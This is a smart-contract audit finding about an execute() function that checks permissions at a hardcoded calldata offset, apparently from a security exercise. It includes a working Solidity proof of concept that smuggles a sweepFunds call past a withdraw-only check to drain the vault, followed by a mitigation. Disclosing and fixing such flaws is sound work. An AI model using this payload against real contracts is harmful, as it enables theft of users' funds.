### [H-1] Hardcoded calldata offset in execute() allows selector spoofing via ABI-smuggled calldata

**Description:** `AuthorizedExecutor.execute()` validates the caller's permission 
by reading a function selector at a hardcoded calldata position — byte 100 
(`4 + 32 * 3`) — rather than following the ABI-encoded offset pointer for the 
`actionData` bytes parameter.

**Impact:** Any caller with permission for a restricted function (e.g. `withdraw`) 
can smuggle an unauthorized function call (e.g. `sweepFunds`) past the selector 
check — fully draining the vault in a single transaction despite having only limited 
withdrawal permissions.

**Proof of Concept:**
1. Build `sweepFunds(recovery, token)` calldata — the malicious payload.
2. Craft a raw calldata payload for `execute()` where:
   - Offset pointer (byte 36) = `0x80` (128) — lies about where actionData starts
   - Byte 68-99 = zeros (filler to push decoy to correct position)
   - Byte 100-103 = `withdraw.selector` (authorized decoy)
   - Byte 104-131 = zeros (padding to complete 32-byte slot)
   - Byte 132-163 = length of sweepFunds calldata
   - Byte 164+ = sweepFunds calldata
3. Call vault with crafted payload — selector check passes, sweepFunds executes.

<details>
<summary>Example Code Snippet</summary>

```solidity
bytes memory sweepFundsCall = abi.encodeWithSelector(
    vault.sweepFunds.selector,
    recovery,
    address(token)
);

bytes memory payload = abi.encodePacked(
    vault.execute.selector,                    // [0:4]     execute
    uint256(uint160(address(vault))),          // [4:36]    target
    uint256(0x80),                             // [36:68]   offset lie → decoder goes to byte 132
    uint256(0),                                // [68:100]  filler → pushes decoy to byte 100
    bytes4(vault.withdraw.selector),           // [100:104] decoy ← security check reads HERE
    bytes28(0),                                // [104:132] padding → completes 32-byte slot
    uint256(sweepFundsCall.length),            // [132:164] real length ← decoder reads HERE
    sweepFundsCall                             // [164:]    real calldata ← decoder executes THIS
);

(bool success,) = address(vault).call(payload);
require(success);
```
</details>

**Recommended Mitigation:**
1. Use `bytes4 selector = bytes4(actionData[:4])` on the decoded parameter, not 
   a raw `calldataload` at a fixed position.

<details>
<summary>Mitigation Code</summary>

```solidity
// Wrong — reads from hardcoded raw calldata position
uint256 calldataOffset = 4 + 32 * 3;
assembly {
    selector := calldataload(calldataOffset)
}

// Right — reads from already-decoded actionData parameter
bytes4 selector = bytes4(actionData[:4]);
```
</details>